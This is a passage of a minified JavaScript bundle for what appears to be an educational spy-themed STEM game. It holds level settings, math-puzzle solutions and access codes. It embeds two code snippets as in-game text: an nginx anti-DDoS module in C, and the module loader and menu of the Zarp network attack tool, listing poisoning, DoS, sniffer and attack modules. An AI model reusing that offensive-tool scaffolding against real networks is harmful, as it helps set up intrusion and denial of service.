Splint",time_to_administer:4e3,time_scalar:.1},pelvic_binder:{id:"pelvic_binder",title:"Pelvic Binder",time_to_administer:4e3,time_scalar:.3},irrigate_wound:{id:"irrigate_wound",title:"Irrigate Wound",time_to_administer:2e3,time_scalar:.1},burn_dressing:{id:"burn_dressing",title:"Burn Dressing",time_to_administer:4e3,time_scalar:.1},initiate_iv_therapy:{id:"initiate_iv_therapy",title:"Initiate IV Therapy",time_to_administer:2e3,time_scalar:.1},debris_removal:{id:"debris_removal",title:"Debris Removal",time_to_administer:2e3,time_scalar:.2},pain_medicine:{id:"pain_medicine",title:"Pain Medicine",time_to_administer:2e3,time_scalar:.05},apply_pressure:{id:"apply_pressure",title:"Apply Pressure",time_to_administer:2e3,time_scalar:.05},combat_gauze:{id:"combat_gauze",title:"Combat Gauze",time_to_administer:2e3,time_scalar:.25},splint:{id:"splint",title:"Splint",time_to_administer:4e3,time_scalar:.1}}},versions:{hard:{num_patients:6,injuries_per_patient:2,max_life_duration:3e5},medium:{num_patients:5,injuries_per_patient:2,max_life_duration:36e4},easy:{num_patients:4,injuries_per_patient:2,max_life_duration:42e4}}},"4_intel_sweep":{config:{slug:"4_intel_sweep",title:"Intel Sweep",description:"Find and report the 5 pieces of critical intel, including Encryption Codes, the name of the group responsible for the launch, the Operation Code Name, Lat-Long Coordinates, and the type of payload the launch contained.",stem_breakdown:{science:20,technology:55,engineering:0,math:25},instructions:{description:""}},versions:{hard:{},medium:{},easy:{}}},"5_security_bypass":{config:{slug:"5_security_bypass",title:"Security Bypass",description:"Unlock all three levels of the security math puzzle by connecting the adjacent numeric and operator tiles that equate to the required number.",stem_breakdown:{science:0,technology:20,engineering:0,math:80},instructions:{description:""},time_limits:[300,240,180]},versions:{hard:{countdown:180,gridSize:7,skillTime:20,equations:{levels:[[{answer:30,solve:[2,"multiply",5,"multiply",3],number_range:"1_20",exclude:[]},{answer:31,solve:[15,"multiply",3,"subtract",14],number_range:"1_20",exclude:[]},{answer:32,solve:[12,"multiply",3,"subtract",4],number_range:"1_20",exclude:[]},{answer:33,solve:[10,"multiply",3,"add",3],number_range:"1_20",exclude:[]},{answer:34,solve:[5,"multiply",4,"add",14],number_range:"1_20",exclude:[]},{answer:35,solve:[6,"multiply",6,"subtract",1],number_range:"1_20",exclude:[]},{answer:36,solve:[7,"multiply",5,"add",1],number_range:"1_20",exclude:[]},{answer:37,solve:[8,"multiply",5,"subtract",3],number_range:"1_20",exclude:[]},{answer:38,solve:[5,"multiply",5,"add",13],number_range:"1_20",exclude:[]},{answer:39,solve:[3,"multiply",11,"add",6],number_range:"1_20",exclude:[]}],[{answer:40,solve:[3,"multiply",12,"add",3,"add",1],number_range:"1_20",exclude:[]},{answer:41,solve:[3,"multiply",13,"subtract",4,"add",6],number_range:"1_20",exclude:[]},{answer:42,solve:[6,"multiply",6,"add",10,"subtract",4],number_range:"1_20",exclude:[]},{answer:43,solve:[10,"multiply",4,"add",2,"add",1],number_range:"1_20",exclude:[]},{answer:44,solve:[5,"multiply",10,"subtract",7,"add",1],number_range:"1_20",exclude:[]},{answer:45,solve:[4,"add",1,"multiply",3,"multiply",3],number_range:"1_20",exclude:[]},{answer:46,solve:[9,"multiply",5,"add",5,"subtract",4],number_range:"1_20",exclude:[]},{answer:47,solve:[6,"multiply",7,"add",4,"add",1],number_range:"1_20",exclude:[]},{answer:48,solve:[5,"multiply",11,"subtract",6,"subtract",1],number_range:"1_20",exclude:[]},{answer:49,solve:[4,"multiply",11,"add",6,"subtract",1],number_range:"1_20",exclude:[]}],[{answer:72,solve:[3,"multiply",20,"add",4,"add",4,"add",4],number_range:"1_20",exclude:[]},{answer:73,solve:[4,"multiply",11,"add",20,"add",5,"add",4],number_range:"1_20",exclude:[]},{answer:74,solve:[4,"multiply",15,"add",8,"add",2,"add",4],number_range:"1_20",exclude:[]},{answer:75,solve:[2,"multiply",15,"multiply",3,"subtract",5,"subtract",10],number_range:"1_20",exclude:[]},{answer:76,solve:[3,"multiply",6,"multiply",4,"add",2,"add",2],number_range:"1_20",exclude:[]},{answer:77,solve:[4,"add",6,"add",10,"multiply",4,"subtract",3],number_range:"1_20",exclude:[]},{answer:78,solve:[5,"multiply",10,"add",20,"subtract",2,"add",10],number_range:"1_20",exclude:[]}]]}},medium:{countdown:360,gridSize:5,skillTime:25,equations:{levels:[[{answer:28,solve:[6,"multiply",4,"add",4],number_range:"1_20",exclude:[]},{answer:29,solve:[5,"multiply",4,"add",9],number_range:"1_20",exclude:[]},{answer:30,solve:[2,"multiply",5,"multiply",3],number_range:"1_20",exclude:[]},{answer:31,solve:[15,"multiply",3,"subtract",14],number_range:"1_20",exclude:[]},{answer:32,solve:[12,"multiply",3,"subtract",4],number_range:"1_20",exclude:[]},{answer:33,solve:[10,"multiply",3,"add",3],number_range:"1_20",exclude:[]},{answer:34,solve:[5,"multiply",4,"add",14],number_range:"1_20",exclude:[]}],[{answer:40,solve:[3,"multiply",12,"add",3,"add",1],number_range:"1_20",exclude:[]},{answer:41,solve:[3,"multiply",13,"subtract",4,"add",6],number_range:"1_20",exclude:[]},{answer:42,solve:[6,"multiply",6,"add",10,"subtract",4],number_range:"1_20",exclude:[]},{answer:43,solve:[10,"multiply",4,"add",2,"add",1],number_range:"1_20",exclude:[]},{answer:44,solve:[5,"multiply",10,"subtract",7,"add",1],number_range:"1_20",exclude:[]},{answer:45,solve:[4,"add",1,"multiply",3,"multiply",3],number_range:"1_20",exclude:[]},{answer:46,solve:[9,"multiply",5,"add",5,"subtract",4],number_range:"1_20",exclude:[]},{answer:47,solve:[6,"multiply",7,"add",4,"add",1],number_range:"1_20",exclude:[]},{answer:48,solve:[5,"multiply",11,"subtract",6,"subtract",1],number_range:"1_20",exclude:[]},{answer:49,solve:[4,"multiply",11,"add",6,"subtract",1],number_range:"1_20",exclude:[]}],[{answer:72,solve:[3,"multiply",20,"add",4,"add",4,"add",4],number_range:"1_20",exclude:[]},{answer:73,solve:[4,"multiply",11,"add",20,"add",5,"add",4],number_range:"1_20",exclude:[]},{answer:74,solve:[4,"multiply",15,"add",8,"add",2,"add",4],number_range:"1_20",exclude:[]},{answer:75,solve:[2,"multiply",15,"multiply",3,"subtract",5,"subtract",10],number_range:"1_20",exclude:[]},{answer:76,solve:[3,"multiply",6,"multiply",4,"add",2,"add",2],number_range:"1_20",exclude:[]},{answer:77,solve:[4,"add",6,"add",10,"multiply",4,"subtract",3],number_range:"1_20",exclude:[]},{answer:78,solve:[5,"multiply",10,"add",20,"subtract",2,"add",10],number_range:"1_20",exclude:[]}]]}},easy:{countdown:720,gridSize:3,skillTime:30,equations:{levels:[[{answer:20,solve:[2,"multiply",5,"multiply",2],number_range:"1_20",exclude:[]},{answer:21,solve:[10,"multiply",2,"add",1],number_range:"1_20",exclude:[]},{answer:22,solve:[6,"multiply",4,"subtract",2],number_range:"1_20",exclude:[]},{answer:23,solve:[5,"multiply",5,"subtract",2],number_range:"1_20",exclude:[]},{answer:24,solve:[5,"multiply",4,"add",4],number_range:"1_20",exclude:[]},{answer:25,solve:[4,"multiply",5,"add",5],number_range:"1_20",exclude:[]},{answer:26,solve:[9,"multiply",3,"subtract",1],number_range:"1_20",exclude:[]},{answer:27,solve:[10,"multiply",3,"subtract",3],number_range:"1_20",exclude:[]}],[{answer:40,solve:[3,"multiply",12,"add",3,"add",1],number_range:"1_20",exclude:[]},{answer:41,solve:[3,"multiply",13,"subtract",4,"add",6],number_range:"1_20",exclude:[]},{answer:42,solve:[6,"multiply",6,"add",10,"subtract",4],number_range:"1_20",exclude:[]},{answer:43,solve:[10,"multiply",4,"add",2,"add",1],number_range:"1_20",exclude:[]},{answer:44,solve:[5,"multiply",10,"subtract",7,"add",1],number_range:"1_20",exclude:[]},{answer:45,solve:[4,"add",1,"multiply",3,"multiply",3],number_range:"1_20",exclude:[]},{answer:46,solve:[9,"multiply",5,"add",5,"subtract",4],number_range:"1_20",exclude:[]},{answer:47,solve:[6,"multiply",7,"add",4,"add",1],number_range:"1_20",exclude:[]},{answer:48,solve:[5,"multiply",11,"subtract",6,"subtract",1],number_range:"1_20",exclude:[]},{answer:49,solve:[4,"multiply",11,"add",6,"subtract",1],number_range:"1_20",exclude:[]}],[{answer:61,solve:[20,"multiply",3,"add",11,"subtract",5,"subtract",5],number_range:"1_20",exclude:[]},{answer:62,solve:[8,"multiply",6,"add",3,"subtract",20,"multiply",2],number_range:"1_20",exclude:[]},{answer:63,solve:[13,"multiply",3,"add",10,"multiply",2,"subtract",35],number_range:"1_20",exclude:[]},{answer:64,solve:[21,"add",1,"multiply",3,"add",8,"subtract",10],number_range:"1_20",exclude:[]},{answer:65,solve:[12,"multiply",4,"subtract",16,"multiply",2,"add",1],number_range:"1_20",exclude:[]}]]}}}},"6_access_intel":require("./stubs/access_intel/access_intel")}};module.exports=stub;
},{"./stubs/access_intel/access_intel":152,"./stubs/clear_path/clear_path":185,"shared/paths":141}],152:[function(require,module,exports){
var paths=require("shared/paths"),VIDEO_PATH=paths.VIDEOS;module.exports={config:{slug:"6_access_intel",title:"Access Intel",description:"This is it, we need to gain access to the intel within this system and find out the intentions for this craft. You need to be very resourceful in how you use all the pieces of intel you have gathered so far and think beyond the parameters of this environment to solve the challenges.",stem_breakdown:{science:15,technology:60,engineering:0,math:25},finale_video:VIDEO_PATH+"STEM-i08",level1_prepop_code:"KL596ZH9",level1_codes:["KL596ZH9","TX89G044A","CZ82D4","AZ93D133B","HG75NM","3ZXUMY4","A301ETAM","KL8F7F5","19KILI341","ON613ZT","DX89MON"],range:{time:{high:60,low:300},skill:{high:2600,low:100}}},versions:{hard:[{countdown:300,level2:{id:"top",title:"ACCESS DIRECTORY",contains:[require("./level2/microchip_images"),require("./level2/root_code1"),require("./level2/root_code2"),require("./level2/root_code3"),require("./level2/root_code4"),require("./level2/root_code5"),require("./level2/root_code6"),require("./level2/sys_logs"),{id:"locked_folder",title:"Terra",type:"locked_folder",password:"garymckinnon",passcolor:["#99ff80","#f5da89","#f980ff","#f5aa89","#89f5f5"]}]},level3:{winningSelections:["1_6","5_2","1_3","9_3"],games:[{type:"model",file:"satellite",answer:"1_6"},{type:"map",coords:[52,13]}]}}],medium:[{countdown:900,level1:{code1:"KL596ZH9",code2:"TX89G044A",code3:"CZ82D4"},level2:{id:"top",title:"ACCESS DIRECTORY",contains:[require("./level2/microchip_images"),require("./level2/root_code1"),require("./level2/root_code2"),require("./level2/root_code3"),require("./level2/root_code4"),require("./level2/root_code5"),require("./level2/root_code6"),require("./level2/sys_logs"),{id:"locked_folder",title:"Terra",type:"locked_folder",password:"garymckinnon",passcolor:["#99ff80","#f5da89","#f980ff","#f5aa89","#89f5f5"]}]},level3:{winningSelections:["1_6","5_2","1_3","9_3"],games:[{type:"model",file:"satellite",answer:"1_6"},{type:"map",coords:[52,13]}]}}],easy:[{countdown:1200,level1:{code1:"KL596ZH9",code2:"TX89G044A",code3:"CZ82D4"},level2:{id:"top",title:"ACCESS DIRECTORY",contains:[require("./level2/microchip_images"),require("./level2/root_code1"),require("./level2/root_code2"),require("./level2/root_code3"),require("./level2/root_code4"),require("./level2/root_code5"),require("./level2/root_code6"),require("./level2/sys_logs"),{id:"locked_folder",title:"Terra",type:"locked_folder",password:"garymckinnon",passcolor:["#99ff80","#f5da89","#f980ff","#f5aa89","#89f5f5"]}]},level3:{winningSelections:["1_6","5_2","1_3","9_3"],games:[{type:"model",file:"satellite",answer:"1_6"},{type:"map",coords:[52,13]}]}}]}};
},{"./level2/microchip_images":177,"./level2/root_code1":178,"./level2/root_code2":179,"./level2/root_code3":180,"./level2/root_code4":181,"./level2/root_code5":182,"./level2/root_code6":183,"./level2/sys_logs":184,"shared/paths":141}],153:[function(require,module,exports){
module.exports="NaN	 <br/> 	int code = (int) r->headers_out.status; <br/> 	 <br/> 	if (code == 304) { <br/> 		ngx_http_anddos_clients[key].notmod_count += 1; <br/> 		ngx_http_anddos_state.notmod_count += 1; <br/> 	} <br/> 	 <br/> 	if (code < 200) {  <br/> 		ngx_http_anddos_clients[key].http1_count += 1; <br/> 		ngx_http_anddos_state.http1_count += 1; <br/> 	} else <br/> 		if (code < 300) {       //we keep all 3xx (incl.304) <br/> 		ngx_http_anddos_clients[key].http2_count += 1; <br/> 		ngx_http_anddos_state.http2_count += 1; <br/> 	} else <br/> 		if (code < 400) {  <br/> 		ngx_http_anddos_clients[key].http3_count += 1; <br/> 		ngx_http_anddos_state.http3_count += 1; <br/> 	} else <br/> 		if (code < 500) {  <br/> 		ngx_http_anddos_clients[key].http4_count += 1; <br/> 		ngx_http_anddos_state.http4_count += 1; <br/> 	} else {  <br/> 		ngx_http_anddos_clients[key].http5_count += 1; <br/> 		ngx_http_anddos_state.http5_count += 1; <br/> 	} <br/>  <br/> } <br/>  <br/> inline float <br/> ngx_http_anddos_count_fdiff(float global, float client) { <br/> 	//what about attack by many very fast and not 'heavy' reqs ..no reason to do that, but  <br/> better block both extrems <br/> 	 <br/> 	if (global == 0) return 0; <br/> 	 <br/> 	if (client > global) <br/> 		return (client - global) / global;       //or non-linear math function => exp ? <br/> 	else <br/> 		return (global - client) / global; <br/> } <br/>  <br/> inline unsigned int <br/> ngx_http_anddos_count_diff(unsigned int global, unsigned int client) { <br/> 	  <br/> 	//if (global == 0) return 0; <br/> 	//return abs(client - global) / global;       //or non-linear math function - log/exp ? <br/> 	 <br/> 	return (int) 100 * ngx_http_anddos_count_fdiff((float) global, (float) client); <br/> } <br/>  <br/> void <br/> ngx_http_anddos_undo_stats(int key) { <br/>    //FIX before production deployment <br/> } <br/>  <br/> int <br/> ngx_http_anddos_decide(ngx_http_request_t *r, int key) { <br/> 	//make a decision <br/> 	//if client's param differs to global param by more than threshold, block <br/> 	//threshold depends on reqs count, global state, statistic function <br/> 	//scores are kept from time, when last request was served (->first client) <br/> 	 <br/> 	int dec; <br/> 	dec = 1; <br/> 	 <br/> 	unsigned int score = ngx_http_anddos_clients[key].httpcode_score +  ngx_http_anddos_clients[key].mimetype_score + ngx_http_anddos_clients[key].time_score; <br/> 	 <br/> 	if (score > ngx_http_anddos_state.threshold && ngx_http_anddos_clients[key].request_count  <br/> > 5) dec = 2; <br/>  <br/> 	//when block some client compensate global stats by opposite values of his params <br/> 	if (ngx_http_anddos_clients[key].set == 1 && dec == 2) { <br/> 		ngx_http_anddos_undo_stats(key); <br/> 	} <br/> 	 <br/> 	return dec; <br/> } <br/>  <br/>  <br/> inline unsigned int <br/> ngx_http_anddos_count_score_time(unsigned int c_avg, unsigned int c_html) { <br/> 		return (int) ((ngx_http_anddos_count_diff(ngx_http_anddos_state.avg_time, c_avg) +  <br/> ngx_http_anddos_count_diff(ngx_http_anddos_state.html_avg_time, c_html)) / 2 ); <br/> } <br/>  <br/> inline unsigned int <br/> ngx_http_anddos_count_score_mimetype(unsigned int cnt, unsigned int html, unsigned int css,  <br/> unsigned int javascript, unsigned int image, unsigned int other) { <br/>  <br/> 	float w1 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.html_count /  <br/> ngx_http_anddos_state.request_count, (float)html / cnt); <br/> 	float w2 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.css_count /  <br/> ngx_http_anddos_state.request_count, (float)css / cnt); <br/> 	float w3 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.javascript_count /  <br/> ngx_http_anddos_state.request_count, (float)javascript / cnt); <br/> 	float w4 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.image_count /  <br/> ngx_http_anddos_state.request_count, (float)image / cnt); <br/> 	float w5 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.other_count /  <br/> ngx_http_anddos_state.request_count, (float)other / cnt); <br/> 	 <br/> 	//or weighted sum ? <br/> 	//ngx_log_error(NGX_LOG_ERR, r->connection->log, 0, 'ANDDOS score[%d]: %d %d %d %d %d',  <br/> w1, w2, w3, w4, w5); <br/> 	 <br/> 	return (int) (100 * (w1 + w2 + w3 + w4 + w5));      //lost precision? <br/> } <br/>  <br/> inline unsigned int <br/> ngx_http_anddos_count_score_httpcode(unsigned int cnt, unsigned int c1, unsigned int c2,  <br/> unsigned int c3, unsigned int c4, unsigned int c5) { <br/>  <br/> 	float w1 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.http1_count /  <br/> ngx_http_anddos_state.request_count, (float)c1 / cnt); <br/> 	float w2 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.http2_count /  <br/> ngx_http_anddos_state.request_count, (float)c2 / cnt); <br/> 	float w3 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.http3_count /  <br/> ngx_http_anddos_state.request_count, (float)c3 / cnt); <br/> 	float w4 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.http4_count /  <br/> ngx_http_anddos_state.request_count, (float)c4 / cnt); <br/> 	float w5 = ngx_http_anddos_count_fdiff((float)ngx_http_anddos_state.http5_count /  <br/> ngx_http_anddos_state.request_count, (float)c5 / cnt); <br/> 	 <br/> 	//or weighted sum ? <br/> 	//ngx_log_error(NGX_LOG_ERR, r->connection->log, 0, 'ANDDOS score[%d]: %d %d %d %d %d',  <br/> w1, w2, w3, w4, w5); <br/> 	 <br/> 	return (int) (100 * (w1 + w2 + w3 + w4 + w5));      //lost precision? <br/> }     <br/>  <br/> void <br/> ngx_http_anddos_count_scores(ngx_http_request_t *r, int key) { <br/> 	 <br/> 	//httpcode <br/> 	ngx_http_anddos_clients[key].httpcode_score = ngx_http_anddos_count_score_httpcode( <br/> 	//mimetype <br/> 	ngx_http_anddos_clients[key].mimetype_score = ngx_http_anddos_count_score_mimetype( <br/> 	ngx_http_anddos_clients[key].time_score = ngx_http_anddos_count_score_time(  <br/> ngx_http_anddos_clients[key].avg_time, ngx_http_anddos_clients[key].html_avg_time ); <br/> 	 <br/> 	//passeq <br/> 	//count of unique paths, what globally?? <br/> } <br/>  <br/> inline int <br/> ngx_http_anddos_count_threshold() { <br/> 	 <br/> 	if (ngx_http_anddos_state.request_count < 37 || ngx_http_anddos_state.client_count < 5)  <br/> return INITTHRESHOLD; <br/> 	 <br/> 	int i, min, max, clients; <br/> 	float avg; <br/> 	min = INITTHRESHOLD; <br/> 	max = 0; <br/> 	avg = 0; <br/> 	clients = 0; <br/> 	 <br/> 	//FIX maybe naive? <br/> 	//FIX2 also global state (normal/attack) can be concerned <br/> 	return 150 + avg;     // 2x is too much, 100+ seems to be ok, update: 150 + avg seems to  <br/> be the best (measures)  <br/> 	 <br/> } <br/>  <br/> static ngx_int_t <br/> ngx_http_anddos_learn_filter(ngx_http_request_t *r) { <br/>  <br/> 	//the client data <br/> 	u_char text_key[HASHKEYLEN]; <br/> 	memset(text_key, 0, HASHKEYLEN); <br/> 	ngx_http_anddos_get_client_text(text_key, r); <br/> 	unsigned int key = ngx_hash_key(text_key, ngx_strlen(text_key)) % HASHTABLESIZE; <br/> 	int request_time = ngx_http_anddos_get_msec(r); <br/>  <br/> 	//server stats update <br/> 	ngx_http_anddos_state.request_count += 1; <br/> 	 <br/> 		//r->headers_in.cookies.elts //FIX find clients cookie <br/> 		//FIX compare cookie content <br/> 		//first req let pass (in normal conditions) <br/>  <br/> 	 <br/> 	if ((int) ngx_http_anddos_clients[key].set == 0) { <br/> 		//generate cookie key ---------disabled--------- <br/> 		//int client_key = rand(); //FIX predictable <br/> 		//send a cookie key <br/> 		//ngx_http_anddos_set_cookie(r, client_key); <br/>  <br/> 		//setup in client hashtable <br/> 		ngx_http_anddos_clients[key].set = 1; <br/> 		ngx_http_anddos_clients[key].request_count = 1; <br/> 		//ngx_http_anddos_clients[key].key = client_key; <br/> 		ngx_http_anddos_get_client_text(ngx_http_anddos_clients[key].ua, r); <br/> 		ngx_http_anddos_clients[key].pass_seq[0] = (u_char) (ngx_hash_key(r->uri.data, r-> <br/> uri.len) % 94 + 33); //printable chars from ascii //circ.register will differ same  <br/> sequentions (longer than SEQSTEPS) <br/>  <br/> 		if (DEBUG) ngx_log_error(NGX_LOG_INFO, r->connection->log, 0, 'ANDDOS client[%d]: step  id: %c for uri: %s',  <br/> 				key,  <br/> 				(char) ngx_http_anddos_clients[key].pass_seq[0], <br/> 				(char*) r->uri.data); <br/>  <br/> 		ngx_http_anddos_set_httpcode_stats(r, key); <br/> 		 <br/> 		ngx_http_anddos_set_mimetype_stats(r, key, request_time); <br/>  <br/> 		ngx_http_anddos_state.client_count += 1; <br/>  <br/> 	} else { <br/>  <br/> 		//dont count to stats already blocked clients <br/> 		//FIX (should not be here in production, but useful for development and testing  <br/> purposes) <br/> 		if (ngx_http_anddos_clients[key].set > 1) return ngx_http_next_header_filter(r); //DEV  <br/> FIX <br/> 		 <br/> 		 <br/> 		//web-pass sequence <br/> 		//ngx_http_anddos_clients[key].pass_seq[ngx_http_anddos_clients[key].request_count %  <br/> (SEQSIZE - 1)] = (u_char) (ngx_hash_key(r->uri.data, r->uri.len) % 94 + 33);    // <br/> '+circ.'register will differ same sequentions (longer than SEQSTEPS) <br/> 		if (ngx_http_anddos_clients[key].request_count < (SEQSIZE - 1)) { //register for first  <br/> n requested url hashes <br/> 			ngx_http_anddos_clients[key].pass_seq[ngx_http_anddos_clients[key].request_count]  <br/> = (u_char) (ngx_hash_key(r->uri.data, r->uri.len) % 94 + 33); <br/> 		} <br/>  <br/> 		ngx_http_anddos_clients[key].request_count += 1; <br/>  <br/> 		if (DEBUG) ngx_log_error(NGX_LOG_INFO, r->connection->log, 0, 'ANDDOS client[%d]: step  id: %c for uri: %s',  <br/> 				key,  <br/> 				(char) ngx_http_anddos_clients[key].pass_seq[ngx_http_anddos_clients[ key].'request_count % SEQSIZE],  <br/> 				(char*) r->uri.data); <br/>  <br/> 		ngx_http_anddos_set_httpcode_stats(r, key); <br/> 		 <br/> 		ngx_http_anddos_set_mimetype_stats(r, key, request_time); <br/> 		 <br/> 		ngx_http_anddos_count_scores(r, key); <br/> 		 <br/> 		//DECIDE to BLOCK <br/> 		//and export blocked IP somewhere? <br/> 		ngx_http_anddos_clients[key].set = ngx_http_anddos_decide(r, key); <br/>  <br/> 	} <br/> 	 <br/> 	//if ((ngx_http_anddos_state.request_count % 100) != 37)  <br/> 	ngx_http_anddos_state.threshold = ngx_http_anddos_count_threshold();  //always in dev/test  <br/> env <br/> 	 <br/> 	ngx_http_anddos_clients_stats(r); <br/>  <br/> 	return ngx_http_next_header_filter(r); <br/> } <br/>  <br/> //initializers <br/>  <br/> static char * <br/> ngx_http_anddos(ngx_conf_t *cf, ngx_command_t *cmd, void *conf) { <br/> 	ngx_http_core_loc_conf_t *clcf; <br/>  <br/> 	clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module); <br/> 	clcf->handler = ngx_http_anddos_request_handler; <br/>  <br/> 	return NGX_OK; <br/> } <br/>  <br/> static ngx_int_t <br/> ngx_http_anddos_filter_init(ngx_conf_t *cf) { <br/> 	//FIX handles all requests (incl.blocked)! <br/> 	ngx_http_next_header_filter = ngx_http_top_header_filter; <br/> 	ngx_http_top_header_filter = ngx_http_anddos_learn_filter; <br/>  <br/> 	//dont reinit table in case of worker process fail <br/> 	if ((int) ngx_http_anddos_state.client_count > 0) { <br/> 		return NGX_OK; <br/> 	} <br/> 	 <br/> 	//basic server stats <br/> 	ngx_http_anddos_state.level = 0; <br/> 	ngx_http_anddos_state.threshold = INITTHRESHOLD; <br/> 	ngx_http_anddos_state.client_count = 0; <br/> 	/* <br/> 	ngx_http_anddos_state.notmod_count = 0; <br/> 	ngx_http_anddos_state.request_count = 0; <br/> 	ngx_http_anddos_state.avg_time = 0; <br/> 	ngx_http_anddos_state.html_avg_time = 0; <br/> 	ngx_http_anddos_state.html_count = 0; <br/> 	ngx_http_anddos_state.css_count = 0; <br/> 	ngx_http_anddos_state.javascript_count = 0; <br/> 	ngx_http_anddos_state.image_count = 0; <br/> 	ngx_http_anddos_state.other_count = 0;*/ <br/>  <br/> 	//clean clients list <br/> 	int i; <br/> 	for (i = 0; i < HASHTABLESIZE; i++) { <br/> 		ngx_http_anddos_clients[i].set = 0; <br/> 		/* <br/> 		ngx_http_anddos_clients[i].request_count = 0; <br/> 		ngx_http_anddos_clients[i].notmod_count = 0; <br/> 		ngx_http_anddos_clients[i].avg_time = 0; <br/> 		ngx_http_anddos_clients[i].html_avg_time = 0; <br/> 		ngx_http_anddos_clients[i].key = 0;*/ <br/> 		memset(ngx_http_anddos_clients[i].ua, 0, HASHKEYLEN); <br/> 		memset(ngx_http_anddos_clients[i].pass_seq, 0, SEQSIZE); <br/> 		/*ngx_http_anddos_clients[i].html_count = 0; <br/> 		ngx_http_anddos_clients[i].css_count = 0; <br/> 		ngx_http_anddos_clients[i].javascript_count = 0; <br/> 		ngx_http_anddos_clients[i].image_count = 0; <br/> 		ngx_http_anddos_clients[i].other_count = 0;*/ <br/> 	} <br/>  <br/> 	//dev print hashtable size <br/> 	printf('ANDDOS hashtable size: %ld B\n', (long int) sizeof (ngx_http_anddos_clients)); <br/>  <br/> 	return NGX_OK; <br/> }";
},{}],154:[function(require,module,exports){
module.exports="#! /usr/bin/python <br/>  <br/> from os import getcwd, getuid, _exit <br/> from os.path import exists <br/> from sys import path, argv, exit, version, version_info <br/> path.insert(0, getcwd() + '/src/') <br/> path.insert(0, getcwd() + '/src/core/') <br/> path.insert(0, getcwd() + '/src/modules/') <br/> path.insert(0, getcwd() + '/src/lib/') <br/> from commands import getoutput <br/> # module loading <br/> from src.modules import poison, dos, scanner, services <br/> from src.modules import sniffer, parameter, attacks <br/> import config <br/> import database <br/> from colors import color <br/> import platform <br/> import util <br/>  <br/> try: <br/> 	# load py2.7 stuff here so we can get to the depends check <br/> 	import parse_cmd <br/> 	import importlib <br/> 	import session_manager <br/> 	import stream <br/> except: <br/> 	pass <br/>  <br/>  <br/> class LoadedModules: <br/> 	''' Load modules <br/> 	''' <br/> 	def __init__(self): <br/> 		self.total = 0 <br/> 		self.poison = [] <br/> 		self.dos = [] <br/> 		self.sniffers = [] <br/> 		self.services = [] <br/> 		self.scanner = [] <br/> 		self.parameter = [] <br/> 		self.attacks = [] <br/>  <br/> 	def load(self): <br/> 		''' Load modules.  Verify the module loads successfully <br/> 			before loading it up into the module list; this prevents <br/> 			crashes related to unmet dependencies. <br/> 		''' <br/> 		for module in poison.__all__: <br/> 			if util.check_dependency('src.modules.poison.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.poison.%s' % module, 'poison'),  <br/> 							module) <br/> 				self.poison.append(mod) <br/> 				self.total += 1 <br/> 		for module in dos.__all__: <br/> 			if util.check_dependency('src.modules.dos.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 								'src.modules.dos.%s' % module, 'dos'),  <br/> 								module) <br/> 				self.dos.append(mod) <br/> 				self.total += 1 <br/> 		for module in scanner.__all__: <br/> 			if util.check_dependency('src.modules.scanner.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.scanner.%s' % module, 'scanner'),  <br/> 							module) <br/> 				self.scanner.append(mod) <br/> 				self.total += 1 <br/> 		for module in services.__all__: <br/> 			if util.check_dependency('src.modules.services.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.services.%s' % module, 'services'),  <br/> 							module) <br/> 				self.services.append(mod) <br/> 				self.total += 1 <br/> 		for module in sniffer.__all__: <br/> 			if util.check_dependency('src.modules.sniffer.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.sniffer.%s' % module, 'sniffer'),  <br/> 							module) <br/> 				self.sniffers.append(mod) <br/> 				self.total += 1 <br/> 		for module in parameter.__all__: <br/> 			if util.check_dependency('src.modules.parameter.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.parameter.%s' % module, 'parameter'),  <br/> 							module) <br/> 				self.parameter.append(mod) <br/> 				self.total += 1 <br/> 		for module in attacks.__all__: <br/> 			if util.check_dependency('src.modules.attacks.%s' % module): <br/> 				mod = getattr(importlib.import_module( <br/> 							'src.modules.attacks.%s' % module, 'attacks'),  <br/> 							module) <br/> 				self.attacks.append(mod) <br/> 				self.total += 1 <br/>  <br/>  <br/> def main(): <br/> 	''' Zarp entry point <br/> 	''' <br/>  <br/> 	# set up configuration <br/> 	config.initialize() <br/>  <br/> 	# set up database <br/> 	database.initialize() <br/>  <br/> 	# load modules <br/> 	loader = LoadedModules() <br/> 	loader.load() <br/> 	util.Msg('Loaded %d modules.' % loader.total) <br/>  <br/> 	# handle command line options first <br/> 	if len(argv) > 1: <br/> 		parse_cmd.parse(argv, loader) <br/>  <br/> 	# menus <br/> 	main_menu = ['Poisoners', 'DoS Attacks', 'Sniffers', 'Scanners', <br/> 					 'Parameter', 'Services', 'Attacks', 'Sessions'] <br/>  <br/> 	running = True <br/> 	choice = -1 <br/> 	while running: <br/> 		util.header() <br/> 		choice = util.print_menu(main_menu) <br/> 		if choice == 0: <br/> 			# check if they've got running sessions! <br/> 			cnt = stream.get_session_count() <br/> 			if cnt > 0: <br/> 				display = color.B_YELLOW + 'You have %d sessions running. ' +  <br/> 						  'Are you sure? ' + color.B_GREEN + '[' + color.B_YELLOW +  <br/> 						  'Y' + color.B_GREEN + '/' + color.B_YELLOW + 'n' +  <br/> 						  color.B_GREEN + '] ' + color.END <br/> 				choice = raw_input(display % cnt) <br/> 				if 'y' in choice.lower() or choice == '': <br/> 					util.Msg('Shutting all sessions down...') <br/> 					stream.stop_session('all', -1) <br/> 					running = False <br/>  <br/> 			else: <br/> 				util.debug('Exiting with session count: %d' % (cnt)) <br/> 				util.Msg('Exiting...') <br/> 				running = False <br/>  <br/> 			# remove zarp temporary directory <br/> 			util.init_app('rm -fr /tmp/.zarp/') <br/> 			  <br/> 			